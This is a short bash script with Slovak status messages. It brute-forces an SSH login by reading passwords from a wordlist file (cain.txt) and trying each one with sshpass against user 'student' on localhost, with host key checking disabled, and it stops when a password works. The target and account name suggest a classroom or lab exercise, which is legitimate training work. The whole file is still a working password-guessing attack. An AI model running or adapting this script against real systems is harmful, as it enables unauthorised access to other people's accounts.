#!/bin/bash



while read -r HESLO; do
    echo "skusam $HESLO"

    sshpass -p$HESLO ssh -o StrictHostKeyChecking=no student@localhost exit
    

    if [[ $? -eq 0 ]];then
        echo "trafil som: $HESLO"
        exit
    fi

done < cain.txt


echo "nenajdene"
